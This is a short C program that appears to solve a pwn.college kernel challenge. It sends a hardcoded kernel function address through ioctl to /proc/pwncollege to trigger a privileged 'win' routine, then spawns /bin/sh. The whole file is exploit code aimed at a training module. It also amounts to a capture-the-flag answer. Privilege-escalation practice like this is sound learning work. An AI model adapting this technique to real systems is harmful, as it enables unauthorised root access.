#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

int main() {

	int fd = open("/proc/pwncollege", O_RDWR);
	
	void (* win) (void) = (void (*) (void)) 0xffffffffc00008ed;
	
	int result = ioctl(fd, 0x539, win);
	
	system("/bin/sh");
	
	return 0;
}
